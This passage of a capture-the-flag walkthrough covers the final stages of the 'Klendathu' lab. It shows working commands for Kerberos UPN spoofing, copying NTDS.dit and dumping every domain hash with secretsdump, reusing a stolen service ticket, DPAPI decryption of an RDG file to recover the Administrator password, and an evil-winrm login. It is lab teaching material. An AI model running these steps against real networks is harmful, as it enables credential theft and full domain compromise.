+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host DC1.KLENDATHU.VL -d KLENDATHU.VL -u &#x27;RASCZAK&#x27; -p &#x27;[REDACTED]&#x27; set object &#x27;IBANEZ&#x27; userPrincipalName -v &#x27;FLORES&#x27;</span><br><span class="line">getTGT.py &#x27;KLENDATHU.VL&#x27;/&#x27;FLORES&#x27;:&#x27;HelloWorld123!&#x27; -principal NT_ENTERPRISE</span><br><span class="line">ssh -K flores@klendathu.vl@10.13.38.37</span><br></pre></td></tr></table></figure>
+
+<h3 id="Kerberos-Configuration"><a href="#Kerberos-Configuration" class="headerlink" title="Kerberos Configuration"></a>Kerberos Configuration</h3><p>For either path, ensure your local configuration is correct.</p>
+<p><code>/etc/hosts</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.13.38.35 dc1.klendathu.vl dc1 DC01</span><br><span class="line">10.13.38.36 srv1.klendathu.vl srv1</span><br><span class="line">10.13.38.37 srv2.klendathu.vl srv2</span><br></pre></td></tr></table></figure>
+
+<p><code>/etc/krb5.conf</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[libdefaults]</span><br><span class="line">    default_realm = KLENDATHU.VL</span><br><span class="line">    dns_lookup_realm = false</span><br><span class="line">    dns_lookup_kdc = true</span><br><span class="line">    rdns = false</span><br><span class="line">    forwardable = true</span><br><span class="line">    ticket_lifetime = 24h</span><br><span class="line">    renew_lifetime = 7d</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line">    KLENDATHU.VL = &#123;</span><br><span class="line">        kdc = dc1.klendathu.vl</span><br><span class="line">        admin_server = dc1.klendathu.vl</span><br><span class="line">        default_domain = klendathu.vl</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">[domain_realm]</span><br><span class="line">    .klendathu.vl = KLENDATHU.VL</span><br><span class="line">    klendathu.vl = KLENDATHU.VL</span><br></pre></td></tr></table></figure>
+
+<p><strong>Flag 2</strong> is captured on SRV2.</p>
+<p><img src="/images/Klendathu/flag-linux.png" alt="Flag 2 — Linux"></p>
+<hr>
+<h2 id="Domain-Compromise-—-NTDS-Backup"><a href="#Domain-Compromise-—-NTDS-Backup" class="headerlink" title="Domain Compromise — NTDS Backup"></a>Domain Compromise — NTDS Backup</h2><p>Once on SRV2 as root, we find a full domain controller backup stored on the server:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/inc5543_domaincontroller_backup/</span><br></pre></td></tr></table></figure>
+
+<p>We copy the relevant files to our attack machine:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scp -o GSSAPIAuthentication=yes root@srv2.klendathu.vl:/root/inc5543_domaincontroller_backup/registry/SYSTEM .</span><br><span class="line">scp -o GSSAPIAuthentication=yes \</span><br><span class="line">root@srv2.klendathu.vl:&quot;/root/inc5543_domaincontroller_backup/Active Directory/ntds.dit&quot; .</span><br></pre></td></tr></table></figure>
+
+<p>Dumping all domain hashes:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Klendathu/hash-all.png" alt="All Hashes"></p>
+<p>All domain hashes are recovered, including <code>krbtgt</code> and <code>Administrator</code>.</p>
+<hr>
+<h2 id="DPAPI-Decryption-—-RDG-File"><a href="#DPAPI-Decryption-—-RDG-File" class="headerlink" title="DPAPI Decryption — RDG File"></a>DPAPI Decryption — RDG File</h2><p>On SRV2, there is also a cached Kerberos ticket for <code>svc_backup</code> in <code>/tmp</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat b64 | base64 -d &gt; tb.ccache</span><br><span class="line">export KRB5CCNAME=tb.ccache</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ticket cache: FILE:tb.ccache</span><br><span class="line">Default principal: svc_backup@KLENDATHU.VL</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">14/03/2026 02:00:03  14/03/2026 12:00:03  krbtgt/KLENDATHU.VL@KLENDATHU.VL</span><br></pre></td></tr></table></figure>
+
+<p>Using <code>svc_backup</code>‘s ticket, we access the <code>HomeDirs</code> SMB share:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient.py -k KLENDATHU.VL/svc_backup@DC1.KLENDATHU.VL -no-pass</span><br></pre></td></tr></table></figure>
+
+<p>The share contains:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AppData_Roaming_Backup.zip</span><br><span class="line">jenkins.rdg</span><br></pre></td></tr></table></figure>
+
+<p>The <code>.rdg</code> file is a Remote Desktop Connection Manager credentials file, protected with DPAPI. To decrypt it, we need the DPAPI master key, which can be extracted from the NTDS backup.</p>
+<p>Using DSInternals to extract the boot key and then the DPAPI backup key:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> DSInternals</span><br><span class="line"><span class="built_in">Get-BootKey</span> <span class="literal">-SystemHivePath</span> .\SYSTEM</span><br><span class="line"><span class="built_in">Get-ADDBBackupKey</span> <span class="literal">-DatabasePath</span> .\ntds.dit <span class="literal">-BootKey</span> [<span class="type">REDACTED</span>] | <span class="built_in">Save-DPAPIBlob</span> <span class="literal">-DirectoryPath</span> .\</span><br></pre></td></tr></table></figure>
+
+<p>Decrypting the RDG file:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 rdgdec.py --masterkey=&quot;Roaming/Microsoft/Protect/[REDACTED]&quot; -k work.pvk --sid=&#x27;[REDACTED]&#x27; jenkins.rdg</span><br></pre></td></tr></table></figure>
+
+<p>The decrypted file reveals:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[+] Profile:  KLENDATHU\administrator</span><br><span class="line">    Username: administrator</span><br><span class="line">    Domain:   KLENDATHU</span><br><span class="line">    Password: [REDACTED]</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Domain-Administrator-Access"><a href="#Domain-Administrator-Access" class="headerlink" title="Domain Administrator Access"></a>Domain Administrator Access</h2><p>With the recovered Administrator password, we authenticate to the domain controller:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i DC01 -u &#x27;Administrator&#x27; -p &#x27;[REDACTED]&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Flag 3 (Root flag)</strong> is captured.</p>
+<p><img src="/images/Klendathu/flag-root.png" alt="Root Flag"></p>
+<hr>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Technique</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Initial Access</td>
+<td>Unauthenticated NFS mount → credential recovery from Cisco config</td>
+</tr>
+<tr>
+<td>Credential Cracking</td>
+<td>Hashcat MD5 (Type 5) hash</td>
+</tr>
+<tr>
+<td>Enumeration</td>
+<td>BloodHound, NetExec, SMB share enumeration</td>
+</tr>
+<tr>
+<td>Hash Capture</td>
+<td>MSSQL UNC path coercion via <code>sys.dm_os_file_exists</code></td>
+</tr>
+<tr>
+<td>Privilege Escalation</td>
+<td>Silver Ticket against MSSQL service</td>
+</tr>
+<tr>
+<td>Code Execution</td>
+<td><code>xp_cmdshell</code> → SYSTEM</td>
+</tr>
+<tr>
+<td>Lateral Movement</td>
+<td>Kerberos SSH via machine account creation</td>
+</tr>
+<tr>
+<td>Domain Compromise</td>
+<td>NTDS backup → <code>secretsdump</code></td>
+</tr>
+<tr>
+<td>Credential Recovery</td>
+<td>DPAPI backup key decryption of RDG file</td>
+</tr>
+</tbody></table>
+<hr>
+<p><em>Thanks for reading! If this walkthrough helped you, feel free to share it. Good luck in the lab.</em></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Klendathu-%E2%80%94-VulnLab-Chain-HTB-Mini-ProLab-Writeup-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Klendathu — VulnLab Chain &#x2F; HTB Mini ProLab Writeup &amp; Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Environment-Overview"><span class="toc-number">1.2.</span> <span class="toc-text">Environment Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reconnaissance"><span class="toc-number">1.3.</span> <span class="toc-text">Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Port-Scanning"><span class="toc-number">1.3.1.</span> <span class="toc-text">Port Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DC1-%E2%80%94-Domain-Controller"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">DC1 — Domain Controller</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SRV1-%E2%80%94-SQL-Server"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">SRV1 — SQL Server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SRV2-%E2%80%94-Linux-Server"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">SRV2 — Linux Server</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-%E2%80%94-NFS-Share"><span class="toc-number">1.4.</span> <span class="toc-text">Initial Access — NFS Share</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration-with-Valid-Credentials"><span class="toc-number">1.5.</span> <span class="toc-text">Enumeration with Valid Credentials</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-Shares"><span class="toc-number">1.5.1.</span> <span class="toc-text">SMB Shares</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Signing"><span class="toc-number">1.5.2.</span> <span class="toc-text">LDAP Signing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-Collection"><span class="toc-number">1.5.3.</span> <span class="toc-text">BloodHound Collection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Coercion-Vulnerabilities"><span class="toc-number">1.5.4.</span> <span class="toc-text">Coercion Vulnerabilities</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL-%E2%80%94-Hash-Capture-via-UNC-Path"><span class="toc-number">1.6.</span> <span class="toc-text">MSSQL — Hash Capture via UNC Path</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-%E2%80%94-ForceChangePassword"><span class="toc-number">1.7.</span> <span class="toc-text">Privilege Escalation — ForceChangePassword</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Silver-Ticket-Attack-%E2%80%94-MSSQL-Admin-Access"><span class="toc-number">1.8.</span> <span class="toc-text">Silver Ticket Attack — MSSQL Admin Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code-Execution-on-SRV1"><span class="toc-number">1.9.</span> <span class="toc-text">Code Execution on SRV1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lateral-Movement-to-Linux-%E2%80%94-Kerberos-SSH"><span class="toc-number">1.10.</span> <span class="toc-text">Lateral Movement to Linux — Kerberos SSH</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Path-1-%E2%80%94-Machine-Account-Creation-Used"><span class="toc-number">1.10.1.</span> <span class="toc-text">Path 1 — Machine Account Creation (Used)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Path-2-%E2%80%94-UPN-Spoofing-Alternative"><span class="toc-number">1.10.2.</span> <span class="toc-text">Path 2 — UPN Spoofing (Alternative)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos-Configuration"><span class="toc-number">1.10.3.</span> <span class="toc-text">Kerberos Configuration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Compromise-%E2%80%94-NTDS-Backup"><span class="toc-number">1.11.</span> <span class="toc-text">Domain Compromise — NTDS Backup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DPAPI-Decryption-%E2%80%94-RDG-File"><span class="toc-number">1.12.</span> <span class="toc-text">DPAPI Decryption — RDG File</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Administrator-Access"><span class="toc-number">1.13.</span> <span class="toc-text">Domain Administrator Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">1.14.</span> <span class="toc-text">Summary</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/&text=VL-Klendathu"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/&title=VL-Klendathu"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/&is_video=false&description=VL-Klendathu"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Klendathu&body=Check out this article: https://panosoikogr.github.io/2026/03/14/VL-Klendathu/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/&title=VL-Klendathu"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/&title=VL-Klendathu"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/&title=VL-Klendathu"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/&title=VL-Klendathu"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/&name=VL-Klendathu&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/&t=VL-Klendathu"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2027
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="panosoikogr" data-description="Support me on Buy me a coffee!" data-message="Thanks for stopping by! If you’d like to support my work, feel free to treat me to a coffee." data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+</body>
+</html>
